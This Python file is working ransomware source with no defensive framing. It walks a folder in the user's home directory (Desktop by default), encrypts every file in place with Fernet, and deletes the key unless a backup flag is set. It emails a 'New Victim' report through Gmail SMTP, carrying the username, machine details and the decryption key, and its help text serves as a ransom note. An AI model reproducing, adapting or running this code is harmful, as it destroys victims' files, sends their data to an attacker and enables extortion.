import argparse
from ast import pattern
import getpass
import os
import pathlib
import smtplib
import platform
import re
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
from pyrsistent import v



parser = argparse.ArgumentParser(description=f'Your file has been encrypted Contact us {os.environ.get("gmail_account")} for futher details"')
parser.add_argument('-k', '--key' , type=str, metavar='', help='add cryptographic key to decrypt the document')
parser.add_argument('-b','--backup', help='add crypthographyc key to decrypt the document', action='store_true')
parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
args = parser.parse_args()


#get target location 

def get_target_location(d_name):
    f_location = pathlib.Path.home() / d_name
    os.chdir(f_location)
    return f_location

#directory enumeration
def enum_directory_files(directory):   

    list_files = []

    t_location_folder = get_target_location(directory)

    folder_items = os.listdir(t_location_folder)
    
    [list_files.append(var)  for var in folder_items if "." in var]

    return list_files

#leave the .*
def trim_list_files(list):

    trimmed_list =  []
    for var in list:
        var = re.sub(r'^.*?\.', '.', var)
        trimmed_list.append(var)
    
    return(trimmed_list)



def send_email():
    load_dotenv() 
    email_address = os.environ.get("gmail_account")
    password = os.environ.get("gmail_password")
    msg = MIMEMultipart()
    msg['Subject'] = f'New Victim - { getpass.getuser() }'
    msg['From'] = email_address
    msg['to'] = email_address
    crypto_key = f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key'
    msg_body = ( 
        f'Username: {getpass.getuser()} \n'
        f'\n'
        f'System: {platform.uname().system} \n'
        f'None: {platform.uname().node} \n'
        f'Release: {platform.uname().release} \n'
        f'Version: {platform.uname().version} \n'
        f'Machine: {platform.uname().machine} \n'
        f'Processor: {platform.uname().processor} \n'
        f'\n'
        f'Cryptographic Key: { open(crypto_key).read() } \n'
        )
    msg.attach(MIMEText(msg_body,'plain'))
    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(email_address, password)
        smtp_server.sendmail(email_address, email_address, msg.as_string())
        smtp_server.close()
    except Exception as error_msg:
        print ("Error:",error_msg)



def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)
    send_email()

def encrypt_files(file_list):
    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
        cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    if file_list:
        for document in file_list:
            with open(document, 'rb') as file:
                document_original = file.read()
            document_criptat = fernet.encrypt(document_original)
            with open(document, 'wb') as encrypted_document:
                encrypted_document.write(document_criptat)
        if args.backup == False:        
            os.remove(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key') 
    else:
        print('No document in directory')